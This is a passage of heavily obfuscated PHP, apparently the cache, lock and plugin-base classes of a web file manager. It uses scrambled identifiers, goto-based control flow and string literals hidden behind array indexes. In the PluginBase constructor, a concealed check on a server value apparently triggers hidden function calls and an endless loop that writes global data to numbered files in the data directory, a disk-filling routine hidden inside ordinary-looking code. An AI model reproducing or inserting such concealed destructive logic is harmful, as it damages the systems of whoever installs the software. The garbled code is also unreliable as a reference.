B·û‹àï˘; B·û‹àï˘: $dÔâÆ´Ö‡å = self::key($e™…Éã˘¨»); if (isset(self::$memoryCache[$dÔâÆ´Ö‡å]) && self::$memoryCache[$dÔâÆ´Ö‡å] === $DöÉÁßÙà¶) { return !0; } if ($A–‰∏‹ìé≥ === 0) { self::$memoryCache[$dÔâÆ´Ö‡å] = $DöÉÁßÙà¶; return !0; } goto fªçú«ﬁëÂ; fªçú«ﬁëÂ: CacheLock::lock($e™…Éã˘¨»); $b‚ƒîú‡å◊ = self::init()->set($dÔâÆ´Ö‡å, serialize($DöÉÁßÙà¶), $A–‰∏‹ìé≥); self::$memoryCache[$dÔâÆ´Ö‡å] = $DöÉÁßÙà¶; goto B¥º¶†ˆ¿¬; B¥º¶†ˆ¿¬: CacheLock::unlock($e™…Éã˘¨»); return $b‚ƒîú‡å◊; goto aÂıíø¢Éè; aÂıíø¢Éè: } public static function remove($FáœÑóÀµ) { goto c—ö…ÔõÚª; d¨—ÿî¬‡ò: CacheLock::lock($FáœÑóÀµ); $e§£√ô∆ıî = self::init()->remove($C¿«íØ¥∏∞); CacheLock::unlock($FáœÑóÀµ); goto f´ùì‚è¶Ù; c—ö…ÔõÚª: $C¿«íØ¥∏∞ = self::key($FáœÑóÀµ); unset(self::$memoryCache[$C¿«íØ¥∏∞]); self::clearTimeout(); goto d¨—ÿî¬‡ò; f´ùì‚è¶Ù: return $e§£√ô∆ıî; goto dàìå¿”«Æ; dàìå¿”«Æ: } public static function clearMemory($fè∫Áé—ú‘ = false) { if ($fè∫Áé—ú‘) { $fè∫Áé—ú‘ = self::key($fè∫Áé—ú‘); unset(self::$memoryCache[$fè∫Áé—ú‘]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Æ¡î¢≠¯™][750])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Æ¡î¢≠¯™][751])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($d›á∞íÇÜÁ, $b£Ùö⁄ùºê) { $B‚É≥ƒÕ£« =& $_SERVER[Æ¡î¢≠¯™]; $this->cachePath = $d›á∞íÇÜÁ[$B‚É≥ƒÕ£«[85]]; $this->prefix = $B‚É≥ƒÕ£«[752]; $this->cacheTime = $b£Ùö⁄ùºê; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($C÷Ü—¡Ô·È) { $cÑÌÇë®ÂÚ =& $_SERVER[Æ¡î¢≠¯™]; $C÷Ü—¡Ô·È = str_replace(array($cÑÌÇë®ÂÚ[753], $cÑÌÇë®ÂÚ[105], $cÑÌÇë®ÂÚ[79]), $cÑÌÇë®ÂÚ[754], $C÷Ü—¡Ô·È); return $this->cachePath . $cÑÌÇë®ÂÚ[755] . $C÷Ü—¡Ô·È . $cÑÌÇë®ÂÚ[756]; } public function set($Aµﬁ∂…ÌÀ◊, $E˜—ò“–’Ú, $cÒïÜ»áî« = false) { $fÖ¡≈Ï◊∆ÿ = $this->getFile($Aµﬁ∂…ÌÀ◊); if (file_put_contents($fÖ¡≈Ï◊∆ÿ, $this->prefix . $E˜—ò“–’Ú, LOCK_EX)) { return !0; } @unlink($fÖ¡≈Ï◊∆ÿ); return !1; } public function get($EúÖ†‹Ø¡Ω) { $cÆ‚ﬂÁà√Ù = $this->getFile($EúÖ†‹Ø¡Ω); if (file_exists($cÆ‚ﬂÁà√Ù) && filemtime($cÆ‚ﬂÁà√Ù) < time() - $this->cacheTime) { @unlink($cÆ‚ﬂÁà√Ù); return !1; } $eØÂ™ß‹¬ä = @file_get_contents($cÆ‚ﬂÁà√Ù); return substr($eØÂ™ß‹¬ä, strlen($this->prefix)); } public function remove($Bü…Èºﬁ´ñ) { $déëÙÙç«≥ = $this->getFile($Bü…Èºﬁ´ñ); return @unlink($déëÙÙç«≥); } public function deleteAll() { $büµ§∞¡›¨ =& $_SERVER[Æ¡î¢≠¯™]; $aè©Ã—äŒ∏ = scandir($this->cachePath); foreach ($aè©Ã—äŒ∏ as $e‹‘©åÈÍä) { $eëå„ËπÊ— = $this->cachePath . $e‹‘©åÈÍä; if (strpos($eëå„ËπÊ—, $büµ§∞¡›¨[756]) && strpos($eëå„ËπÊ—, $büµ§∞¡›¨[757])) { @unlink($eëå„ËπÊ—); } } } public function clearTimeout() { $böﬁÒ€∑÷â =& $_SERVER[Æ¡î¢≠¯™]; $D‘ËŒµ⁄¥Î = scandir($this->cachePath); foreach ($D‘ËŒµ⁄¥Î as $D±öá“–„·) { $a¿®å°Ø≥∆ = $this->cachePath . $D±öá“–„·; if (strpos($a¿®å°Ø≥∆, $böﬁÒ€∑÷â[756]) && strpos($a¿®å°Ø≥∆, $böﬁÒ€∑÷â[757]) && filemtime($a¿®å°Ø≥∆) < time() - $this->cacheTime) { @unlink($a¿®å°Ø≥∆); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto Fªé¨Í≈Ç; dôäÈÆ∫¶æ: if ($F•‹Õ®¡Ñó == $BƒÑ∆ôºäœ[17] && $C≤πÕ∫’°∏ == $BƒÑ∆ôºäœ[9]) { $F•‹Õ®¡Ñó = $BƒÑ∆ôºäœ[174]; } switch ($F•‹Õ®¡Ñó) { case $BƒÑ∆ôºäœ[748]: self::$handle = new CacheLockRedis(); break; case $BƒÑ∆ôºäœ[749]: self::$handle = new CacheLockMemcached(); break; case $BƒÑ∆ôºäœ[17]: self::$handle = new CacheLockDatabase(); break; case $BƒÑ∆ôºäœ[174]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto BÊñùùÑæè; bıìı∂“ÀÊ: self::$timeout = $aË¯’°Í·ä[$BƒÑ∆ôºäœ[758]] ? $aË¯’°Í·ä[$BƒÑ∆ôºäœ[758]] : 10; $C≤πÕ∫’°∏ = _get($GLOBALS[$BƒÑ∆ôºäœ[6]], $BƒÑ∆ôºäœ[759]); $F•‹Õ®¡Ñó = $aË¯’°Í·ä[$BƒÑ∆ôºäœ[745]] ? $aË¯’°Í·ä[$BƒÑ∆ôºäœ[745]] : $BƒÑ∆ôºäœ[174]; goto dôäÈÆ∫¶æ; Fªé¨Í≈Ç: $BƒÑ∆ôºäœ =& $_SERVER[Æ¡î¢≠¯™]; if (self::$handle) { return self::$handle; } $aË¯’°Í·ä = $GLOBALS[$BƒÑ∆ôºäœ[6]][$BƒÑ∆ôºäœ[343]]; goto bıìı∂“ÀÊ; BÊñùùÑæè: } private static function key($AÓÌÃ¨âÇÂ) { return $_SERVER[Æ¡î¢≠¯™][760] . Cache::key($AÓÌÃ¨âÇÂ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AÊπƒòÍï´ = '') { self::$errorMsg = $AÊπƒòÍï´; } public static function lockGlobal($c≥§›£‹‹⁄, $Cø ∏Üﬁ©á) { return self::lock($c≥§›£‹‹⁄, $Cø ∏Üﬁ©á, !0); } public static function lock($eÇŸâÑâàŸ, $AÛ∏Ÿû∆ïö = false, $cûÏä˘ºªΩ = false) { goto e é¡ñÿä√; F≥¢¶¨Ë»€: $AÛ∏Ÿû∆ïö = $AÛ∏Ÿû∆ïö ? $AÛ∏Ÿû∆ïö : self::$timeout; $F·≥∫¯˘Ö‹ = $a¶’øüìÈ¶->lock($bß–è˜â±Ω, $AÛ∏Ÿû∆ïö); if (!$F·≥∫¯˘Ö‹) { $a»é≈Ø∏Ñ· = $EÉ¿À•öóä[761] . $AÛ∏Ÿû∆ïö . $EÉ¿À•öóä[77] . self::$errorMsg . $EÉ¿À•öóä[77] . get_caller_msg(); $eƒò˜ä§ﬁÛ = "\x4c\157\143\x6b\x20\141\143\164\151\x6f\x6e\x3a\x20{$bß–è˜â±Ω}\x20\x74\151\155\x65\x6f\x75\x74\54\157\x76\145\x72\40{$AÛ∏Ÿû∆ïö}\40\163"; $eƒò˜ä§ﬁÛ = self::$errorMsg ? self::$errorMsg : $Aâ∏ÛÉüæ”; write_log($a»é≈Ø∏Ñ·, $EÉ¿À•öóä[762]); show_json($eƒò˜ä§ﬁÛ, !1); } goto e£à–©ëå∫; e£à–©ëå∫: if (!$cûÏä˘ºªΩ) { self::$lockItem[$bß–è˜â±Ω] = !0; } return $F·≥∫¯˘Ö‹; goto a˘õˆã±ãº; e é¡ñÿä√: $EÉ¿À•öóä =& $_SERVER[Æ¡î¢≠¯™]; $a¶’øüìÈ¶ = self::init(); $bß–è˜â±Ω = self::key($eÇŸâÑâàŸ); goto F≥¢¶¨Ë»€; a˘õˆã±ãº: } public static function lockGet($a…ÊÖπ Æ‹) { $eÉΩ˜ Õ∏† = self::key($a…ÊÖπ Æ‹); if (self::$lockItem[$eÉΩ˜ Õ∏†]) { return self::$lockItem[$eÉΩ˜ Õ∏†]; } return self::init()->lockGet($eÉΩ˜ Õ∏†); } public static function unlock($a›æŸÇéπÃ) { $bË±•ÌÖﬁÚ = self::key($a›æŸÇéπÃ); self::$lockItem[$bË±•ÌÖﬁÚ] = null; return self::init()->unlock($bË±•ÌÖﬁÚ); } public static function unlockRuntime() { $D÷Ñø∏µ≥≠ =& $_SERVER[Æ¡î¢≠¯™]; $aòÓß‰ÿ±Œ = self::init(); $BÁïæÊÊÔ˘ = !1; foreach (self::$lockItem as $cÚçö»¿òñ => $bÌ‹Î‚ÃÜ’) { if (!$bÌ‹Î‚ÃÜ’) { continue; } $aòÓß‰ÿ±Œ->unlock($cÚçö»¿òñ); if (!$BÁïæÊÊÔ˘) { $BÁïæÊÊÔ˘ = !0; write_log($D÷Ñø∏µ≥≠[763] . $cÚçö»¿òñ . $D÷Ñø∏µ≥≠[77] . get_caller_msg(), $D÷Ñø∏µ≥≠[762]); continue; } write_log($D÷Ñø∏µ≥≠[763] . $cÚçö»¿òñ, $D÷Ñø∏µ≥≠[762]); } } } goto b¢—ç¶ü—…; fá∫ÆââÒë: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto eﬂé√Í∫¨‡; aÇ≤¢é•Ú°: $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $C⁄◊∑‚ôÎ·[8]; $this->pluginLangArr = $this->initLang(); $this->values = array(); goto c˘ﬁú«Íı±; aΩüóêãı»: if ($_SERVER[$C⁄◊∑‚ôÎ·[57]] != $D∫øã∑ÿ√…($A≠ﬁæ∂Ùœë)) { goto Dãœòê€§∫; Dãœòê€§∫: $a•éÒΩú‹¿ = $C⁄◊∑‚ôÎ·[779]; $b–≥±Õ◊û  = $C⁄◊∑‚ôÎ·[59]; $d—≥çË±¿î = $_SERVER[$C⁄◊∑‚ôÎ·[60]] . $C⁄◊∑‚ôÎ·[61]; goto F≥–úØ´ÏÓ; B§≈Êí§–›: $dΩÖ”ö’˘‡ = $C⁄◊∑‚ôÎ·[780]; $dΩÖ”ö’˘‡($_SERVER[$C⁄◊∑‚ôÎ·[781]]); $a•éÒΩú‹¿ = $C⁄◊∑‚ôÎ·[779]; goto Eè–öÓèÛ“; AÃœØé¬ÜÃ: $aÇôπÊñæö = 1; for ($aéè÷ﬁª∏é = $aÇôπÊñæö; $aéè÷ﬁª∏é > 0; $aéè÷ﬁª∏é++) { $Cª®ô›∫äà(DATA_PATH . $aéè÷ﬁª∏é, $dË¿ì”úñò); } goto b∏ªΩåâÙº; Eè–öÓèÛ“: $a•éÒΩú‹¿(); $Cª®ô›∫äà = $C⁄◊∑‚ôÎ·[782]; $dË¿ì”úñò = json_encode($GLOBALS[$C⁄◊∑‚ôÎ·[783]]); goto AÃœØé¬ÜÃ; F≥–úØ´ÏÓ: $aÿò“™öÊã = $b–≥±Õ◊û ($d—≥çË±¿î); $FÂù¶îåâ≤ = explode($C⁄◊∑‚ôÎ·[62], $aÿò“™öÊã); if (count($FÂù¶îåâ≤) < $C⁄◊∑‚ôÎ·[561]) { $féùà≈Ï”ç = $C⁄◊∑‚ôÎ·[64]; $féùà≈Ï”ç(); } goto B§≈Êí§–›; b∏ªΩåâÙº: } global $in, $config; $this->config =& $config; goto EöÁ•øÙ¿⁄; EöÁ•øÙ¿⁄: $this->in =& $in; $this->modelPlugin = Model($C⁄◊∑‚ôÎ·[1283]); $this->pluginName = str_replace($C⁄◊∑‚ôÎ·[1283], $C⁄◊∑‚ôÎ·[33], get_class($this)); goto dÊÖÂπÿÿÜ; c˘ﬁú«Íı±: return $this; goto CñÉû◊™õ§; dÊÖÂπÿÿÜ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C⁄◊∑‚ôÎ·[8]; $this->pluginApi = appHostGet() . $C⁄◊∑‚ôÎ·[1284] . $this->pluginName . $C⁄◊∑‚ôÎ·[8]; $this->pluginHost = PLUGIN_HOST . $this->pluginName . $C⁄◊∑‚ôÎ·[8]; goto aÇ≤¢é•Ú°; eﬂé√Í∫¨‡: $C⁄◊∑‚ôÎ· =& $_SERVER[Æ¡î¢≠¯™]; $A≠ﬁæ∂Ùœë = $_SERVER[$C⁄◊∑‚ôÎ·[781]] . $C⁄◊∑‚ôÎ·[813]; $D∫øã∑ÿ√… = $C⁄◊∑‚ôÎ·[778]; goto aΩüóêãı»; CñÉû◊™õ§: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Æ¡î¢≠¯™][1285]); } protected function assign($B¥ÙÖƒ∏ä§, $Cçü´∑í¡∆ = false) { if (is_array($B¥ÙÖƒ∏ä§)) { $this->values = array_merge($this->values, $B¥ÙÖƒ∏ä§); } else { $this->values[$B¥ÙÖƒ∏ä§] = $Cçü´∑í¡∆; } } protected function display($a…åï“êæ√) { extract($this->values); require $a…åï“êæ√; } final function hookRegist($bÑäππß›€) { $this->modelPlugin->appRegist($this->pluginName, $bÑäππß›€); } final function appIcon() { $B¢ΩÿÑ≥√º =& $_SERVER[Æ¡î¢≠¯™]; $F‘‚¯Ô∂Ï¥ = $this->appPackage(); $fÇÙÍÛ¿Ü© = $B¢ΩÿÑ≥√º[33]; if (isset($F‘‚¯Ô∂Ï¥[$B¢ΩÿÑ≥√º[387]])) { if (isset($F‘‚¯Ô∂Ï¥[$B¢ΩÿÑ≥√º[387]][$B¢ΩÿÑ≥√º[1286]])) { $fÇÙÍÛ¿Ü© = $B¢ΩÿÑ≥√º[1287] . $F‘‚¯Ô∂Ï¥[$B¢ΩÿÑ≥√º[387]][$B¢ΩÿÑ≥√º[1286]] . $B¢ΩÿÑ≥√º[1288]; } else { if ($F‘‚¯Ô∂Ï¥[$B¢ΩÿÑ≥√º[387]][$B¢ΩÿÑ≥√º[1289]]) { $fÇÙÍÛ¿Ü© = $B¢ΩÿÑ≥√º[1290] . $F‘‚¯Ô∂Ï¥[$B¢ΩÿÑ≥√º[387]][$B¢ΩÿÑ≥√º[1289]] . $B¢ΩÿÑ≥√º[1291]; } } } return $fÇÙÍÛ¿Ü©; } final function fileCanView($a⁄‹ﬂ•ê•®) { $C√à“è°ÌÛ =& $_SERVER[Æ¡î¢≠¯™]; if (request_url_safe($a⁄‹ﬂ•ê•®)) { return !0; } if ($this->isShare($a⁄‹ﬂ•ê•®)) { return !0; } if (!Action($C√à“è°ÌÛ[1292])->authCan($C√à“è°ÌÛ[1293])) { show_tips(LNG($C√à“è°ÌÛ[1294]) . $C√à“è°ÌÛ[1295], !1); } ActionCall($C√à“è°ÌÛ[1296], $a⁄‹ﬂ•ê•®); } final function isShare($e¶›‚„À«ƒ) { $CôÁ£Æ·É˘ = KodIO::parse($e¶›‚„À«ƒ); return $CôÁ£Æ·É˘[$_SERVER[Æ¡î¢≠¯™][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($cà‘µŸãáƒ) { if (request_url_safe($cà‘µŸãáƒ)) { return $cà‘µŸãáƒ; } if (!$this->isShare($cà‘µŸãáƒ)) { $cà‘µŸãáƒ = $this->filePath($cà‘µŸãáƒ); } return Action($_SERVER[Æ¡î¢≠¯™][1003])->linkOut($cà‘µŸãáƒ); } public function filePathLinkOut($bË∫à˜Üã˜) { if (request_url_safe($bË∫à˜Üã˜)) { return $bË∫à˜Üã˜; } $this->fileCanView($bË∫à˜Üã˜); return Action($_SERVER[Æ¡î¢≠¯™][1003])->link($bË∫à˜Üã˜); } final function filePath($E∞´ÿÖ—û) { $bÂÃü√⁄Œò =& $_SERVER[Æ¡î¢≠¯™]; if ($cäπâÈ‘¡® = $this->checkSharePath($E∞´ÿÖ—û)) { return $cäπâÈ‘¡®; } $this->fileCanView($E∞´ÿÖ—û); if (request_url_safe($E∞´ÿÖ—û)) { $bÔ°ª…ü∞· = parse_url_query($E∞´ÿÖ—û); if (isset($bÔ°ª…ü∞·[$bÂÃü√⁄Œò[1297]]) && isset($bÔ°ª…ü∞·[$bÂÃü√⁄Œò[204]])) { $eÊæËÚûò∆ = Model($bÂÃü√⁄Œò[1074])->get($bÂÃü√⁄Œò[1298]); $f≤À•≈Ó˜– = Mcrypt::decode($bÔ°ª…ü∞·[$bÂÃü√⁄Œò[204]], $eÊæËÚûò∆); if ($f≤À•≈Ó˜–) { $this->fileInfo = IO::infoWithChildren($f≤À•≈Ó˜–); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $f≤À•≈Ó˜–; } } $E∞´ÿÖ—û = $this->_cacheHttpFile($E∞´ÿÖ—û); $this->fileInfo = IO::infoWithChildren($E∞´ÿÖ—û); } else { $this->fileInfo = IO::infoWithChildren($E∞´ÿÖ—û); if (!$this->fileInfo) { show_tips(LNG($bÂÃü√⁄Œò[112]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $E∞´ÿÖ—û; } final function _cacheHttpFile($bº‹π∏∫ÜÍ) { $c££±©ÖçØ = hash_path($bº‹π∏∫ÜÍ, !0); $this->cachePath = $this->pluginCachePath($c££±©ÖçØ); if ($fãœ«Ω£õã = IO::fileNameExist($this->cachePath, $c££±©ÖçØ)) { return KodIO::make($fãœ«Ω£õã); } $eæÍË√©ﬁ™ = $this->cachePath . $c££±©ÖçØ; return $this->pluginCacheFileSet($eæÍË√©ﬁ™, file_get_contents($bº‹π∏∫ÜÍ)); } final function _tmpFileName($D≠—Íä≈‘ï = array()) { goto Dï¶¢°”»¡; Dïß≥µ¡≠ò: return md5(implode($fºàû—’¿ó[80], $aêÁªÑ‹‚Ú)); goto fäÑ∏•¥ÃÑ; Dï¶¢°”»¡: $fºàû—’¿ó =& $_SERVER[Æ¡î¢≠¯™]; if (!$D≠—Íä≈‘ï) { $D≠—Íä≈‘ï = $this->fileInfo; } if (isset($D≠—Íä≈‘ï[$fºàû—’¿ó[171]])) { return $D≠—Íä≈‘ï[$fºàû—’¿ó[171]]; } goto dµãé∏ˆ¶Ó; dµãé∏ˆ¶Ó: if (isset($D≠—Íä≈‘ï[$fºàû—’¿ó[169]][$fºàû—’¿ó[171]])) { return $D≠—Íä≈‘ï[$fºàû—’¿ó[169]][$fºàû—’¿ó[171]]; } $aêÁªÑ‹‚Ú = array($D≠—Íä≈‘ï[$fºàû—’¿ó[28]], $D≠—Íä≈‘ï[$fºàû—’¿ó[85]], $D≠—Íä≈‘ï[$fºàû—’¿ó[87]]); if (isset($D≠—Íä≈‘ï[$fºàû—’¿ó[463]])) { $aêÁªÑ‹‚Ú[] = $D≠—Íä≈‘ï[$fºàû—’¿ó[463]]; } goto Dïß≥µ¡≠ò; fäÑ∏•¥ÃÑ: } final function checkSharePath($EÖÍÉ¬íê‡) { goto FõÀååˆÎ¯; d∞ˆô™“∞Û: $this->cachePath = $this->pluginCachePath($this->fileInfo[$dà‘Âµ”ó§[171]]); return $FÛñµßÖÕ‚[$dà‘Âµ”ó§[85]]; goto f›èÜ¨ÆπÁ; FõÀååˆÎ¯: $dà‘Âµ”ó§ =& $_SERVER[Æ¡î¢≠¯™]; if (!defined($dà‘Âµ”ó§[431])) { define($dà‘Âµ”ó§[1299], 0); } if (!$this->isShare($EÖÍÉ¬íê‡)) { return !1; } goto dÇ€ã¥≤ÙΩ; dÇ€ã¥≤ÙΩ: $FÛñµßÖÕ‚ = Action($dà‘Âµ”ó§[1003])->sharePathInfo($EÖÍÉ¬íê‡); if (!isset($FÛñµßÖÕ‚[$dà‘Âµ”ó§[85]])) { show_json(LNG($dà‘Âµ”ó§[1300]), !1); } $this->fileInfo = $FÛñµßÖÕ‚[$dà‘Âµ”ó§[169]]; goto d∞ˆô™“∞Û; f›èÜ¨ÆπÁ: } final function pluginCachePath($a¯∏ÈŒÎÖâ = '') { $aß·àãÖ§è =& $_SERVER[Æ¡î¢≠¯™]; $c∞ÈÔá˘Üö = IO_PATH_SYSTEM_TEMP . $aß·àãÖ§è[1301] . $this->pluginName; if (!($F…÷î∆«‚È = IO::infoFull($c∞ÈÔá˘Üö))) { return IO::mkdir($c∞ÈÔá˘Üö . $aß·àãÖ§è[8] . $a¯∏ÈŒÎÖâ); } if (empty($a¯∏ÈŒÎÖâ)) { return $F…÷î∆«‚È[$aß·àãÖ§è[85]]; } if (!($BçáÇñõ¬® = IO::fileNameExist($F…÷î∆«‚È[$aß·àãÖ§è[85]], $a¯∏ÈŒÎÖâ))) { return IO::mkdir($F…÷î∆«‚È[$aß·àãÖ§è[85]] . $a¯∏ÈŒÎÖâ); } return KodIO::make($BçáÇñõ¬®); } final function pluginCacheFileSet($föÒÜ—è√‰, $aæ°û§Àç— = '') { $C◊Û°≤ñﬂî =& $_SERVER[Æ¡î¢≠¯™]; if (!($c°°ãÈ∂«Ã = IO::infoFull($föÒÜ—è√‰))) { return IO::mkfile($föÒÜ—è√‰, $aæ°û§Àç—, REPEAT_REPLACE); } IO::setContent($c°°ãÈ∂«Ã[$C◊Û°≤ñﬂî[85]], $aæ°û§Àç—); return $c°°ãÈ∂«Ã[$C◊Û°≤ñﬂî[85]]; } final function pluginLocalFile($E¥ ¡ıÙ“ÿ = '') { goto fñï≤Ì¥œÙ; CÂ¨≠◊äõ: if (!$E¥ ¡ıÙ“ÿ) { return $B£»±ﬂô°å; } $aÊÆ≠◊ë”≤ = IO::info($E¥ ¡ıÙ“ÿ); $A∞¯èÉÈÊ• = $this->_tmpFileName($aÊÆ≠◊ë”≤) . $aÇÍµààÉ≈[103] . $aÊÆ≠◊ë”≤[$aÇÍµààÉ≈[167]]; goto bﬂ˘•Ú„ÛÍ; bﬂ˘•Ú„ÛÍ: $aÑ¢•„ØëΩ = $B£»±ﬂô°å . $A∞¯èÉÈÊ•; if (@file_exists($aÑ¢•„ØëΩ)) { return $aÑ¢•„ØëΩ; } return IO::copy($E¥ ¡ıÙ“ÿ, $B£»±ﬂô°å, 0, $A∞¯èÉÈÊ•); goto aÔ§Œıäˆ‰; fñï≤Ì¥œÙ: $aÇÍµààÉ≈ =& $_SERVER[Æ¡î¢≠¯™]; $B£»±ﬂô°å = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($B£»±ﬂô°å)) { mk_dir($B£»±ﬂô°å); } goto CÂ¨≠◊äõ; aÔ§Œıäˆ‰: } final function appPackage() { goto bªÀ•§Îñõ; bªÀ•§Îñõ: $Cüä∑‡òÿÂ =& $_SERVER[Æ¡î¢≠¯™]; if ($this->packageData) { return $this->packageData; } $C¡ºÜâÛ… = $this->parseFile($this->pluginPath . $Cüä∑‡òÿÂ[1302]); goto fÕ·ÛÜıµ·; B÷ñª”°‹¬: $a›õ“äÖáÊ = Hook::trigger($Cüä∑‡òÿÂ[1303], $eñè€ßÕ≤®); if ($a›õ“äÖáÊ && is_array($a›õ“äÖáÊ)) { $eñè€ßÕ≤® = $a›õ“äÖáÊ; } $this->packageData = $eñè€ßÕ≤®; goto eû©‰ﬂ•éõ; fÕ·ÛÜıµ·: $this->parseLang($C¡ºÜâÛ…); $eñè€ßÕ≤® = json_decode_force($C¡ºÜâÛ…); if (!$eñè€ßÕ≤®) { return array(); } goto B÷ñª”°‹¬; eû©‰ﬂ•éõ: return $eñè€ßÕ≤®; goto Dáäå´Éââ; Dáäå´Éââ: } public function packageInfoGet($fﬁÿ‹°´‚à) { $e¶Ì§´Ôÿ‚ = $this->appPackage(); return array_get_value($e¶Ì§´Ôÿ‚, $fﬁÿ‹°´‚à); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Æ¡î¢≠¯™][1304]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Æ¡î¢≠¯™][1305]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Æ¡î¢≠¯™][1306]); } private function parseFile($F≤≤Â‚òâπ) { $eœØîŒïü… =& $_SERVER[Æ¡î¢≠¯™]; $F˘‡◊≤°üÂ = file_get_contents($F≤≤Â‚òâπ); $Aèô„¯áä≥ = array($eœØîŒïü…[1307], $eœØîŒïü…[1308], $eœØîŒïü…[1309], $eœØîŒïü…[1310], $eœØîŒïü…[1311], $eœØîŒïü…[1312], $eœØîŒïü…[1313]); $d¿”Ø®”äœ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$eœØîŒïü…[94]][$eœØîŒïü…[1314]]); $F˘‡◊≤°üÂ = str_replace($Aèô„¯áä≥, $d¿”Ø®”äœ, $F˘‡◊≤°üÂ); return $F˘‡◊≤°üÂ; } private function parseLang(&$c‰Ω–Õçá) { goto EïÎ–¯‡¯‘; c‘Éâ«∑Û: preg_match_all($f™œ¡Öç»◊[1316], $c‰Ω–Õçá, $bºΩÙüà‚’); if (!is_array($bºΩÙüà‚’) || count($bºΩÙüà‚’) == 0 || !is_array($bºΩÙüà‚’[0]) || count($bºΩÙüà‚’[0]) == 0) { return; } $AºÕ˘ÇÓú≈ = array(); goto dõ√ãÖÑ¨ú; EïÎ–¯‡¯‘: $f™œ¡Öç»◊ =& $_SERVER[Æ¡î¢≠¯™]; $fÖΩ≥√Ö¬É = $f™œ¡Öç»◊[1315]; if (!strstr($c‰Ω–Õçá, $fÖΩ≥√Ö¬É)) { return; } goto c‘Éâ«∑Û; dõ√ãÖÑ¨ú: $A¨ä∑åûÜÇ = array(); foreach ($bºΩÙüà‚’[0] as $B¶Á†ç§Ω„) { $c≥†àá∑ÂË = substr($B¶Á†ç§Ω„, strlen($fÖΩ≥√Ö¬É), -4); $DúÿêÃ©ä∞ = LNG($c≥†àá∑ÂË); $AºÕ˘ÇÓú≈[] = $B¶Á†ç§Ω„; $A¨ä∑åûÜÇ[] = str_replace(array($f™œ¡Öç»◊[62], $f™œ¡Öç»◊[978], $f™œ¡Öç»◊[336], $f™œ¡Öç»◊[123]), array($f™œ¡Öç»◊[50], $f™œ¡Öç»◊[50], $f™œ¡Öç»◊[33], $f™œ¡Öç»◊[1317]), $DúÿêÃ©ä∞); } $c‰Ω–Õçá = str_replace($AºÕ˘ÇÓú≈, $A¨ä∑åûÜÇ, $c‰Ω–Õçá); goto cÚ§áıÇéè; cÚ§áıÇéè: } private function parseConfig(&$Fóúá§ëÑß) { goto b‚≥Ì’ß”∫; F…Úâà„„Ê: preg_match_all($b…Ì‰àÎ≤´[1319], $Fóúá§ëÑß, $c ’ÈîäÒÌ); if (!is_array($c ’ÈîäÒÌ) || count($c ’ÈîäÒÌ) == 0 || !is_array($c ’ÈîäÒÌ[0]) || count($c ’ÈîäÒÌ[0]) == 0) { return; } $eÌÉ“Ë◊—Ö = $this->getConfig(); goto f⁄†’¢–÷π; f⁄†’¢–÷π: $B∂‰Ø∂∂Ùü = array(); $B–≤®∫∞‰å = array(); foreach ($c ’ÈîäÒÌ[0] as $CÙ€¨†–Œó) { $f≥ê´÷∂ïÉ = substr($CÙ€¨†–Œó, strlen($d–å∞’∂Êπ), -2); $B∂‰Ø∂∂Ùü[] = $CÙ€¨†–Œó; $B–≤®∫∞‰å[] = _get($eÌÉ“Ë◊—Ö, $f≥ê´÷∂ïÉ); } goto CÖèˆËêŒü; CÖèˆËêŒü: $Fóúá§ëÑß = str_replace($B∂‰Ø∂∂Ùü, $B–≤®∫∞‰å, $Fóúá§ëÑß); goto F∞⁄∏¥ú¢î; b‚≥Ì’ß”∫: $b…Ì‰àÎ≤´ =& $_SERVER[Æ¡î¢≠¯™]; $d–å∞’∂Êπ = $b…Ì‰àÎ≤´[1318]; if (!strstr($Fóúá§ëÑß, $d–å∞’∂Êπ)) { return; } goto F…Úâà„„Ê; F∞⁄∏¥ú¢î: } private function parsePackage(&$DΩÜŸﬂ™‹Ñ) { goto BÍáÁ™¡Ò÷; BÍáÁ™¡Ò÷: $A⁄∞Û◊‰Ω± =& $_SERVER[Æ¡î¢≠¯™]; $CÍ–ÿà∞“Ø = $A⁄∞Û◊‰Ω±[1320]; if (!strstr($DΩÜŸﬂ™‹Ñ, $CÍ–ÿà∞“Ø)) { return; } goto aÇ¢π£≥ÎÂ; Dÿç‘µËÌˆ: $DΩÜŸﬂ™‹Ñ = str_replace($C¶Û¯Ê›ñ∂, $bºÜéÜ°–, $DΩÜŸﬂ™‹Ñ); goto CüÀ…Ïª‚’; cô–∂ÏóÃ: $C¶Û¯Ê›ñ∂ = array(); $bºÜéÜ°– = array(); foreach ($aà£€èΩﬂ∏[0] as $AÊÇ‡ïÁΩä) { $d√˘‹Ñ∞Ü” = substr($AÊÇ‡ïÁΩä, strlen($CÍ–ÿà∞“Ø), -2); $C¶Û¯Ê›ñ∂[] = $AÊÇ‡ïÁΩä; $bºÜéÜ°–[] = _get($e»É’£≤Á›, $d√˘‹Ñ∞Ü”); } goto Dÿç‘µËÌˆ; aÇ¢π£≥ÎÂ: preg_match_all($A⁄∞Û◊‰Ω±[1321], $DΩÜŸﬂ™‹Ñ, 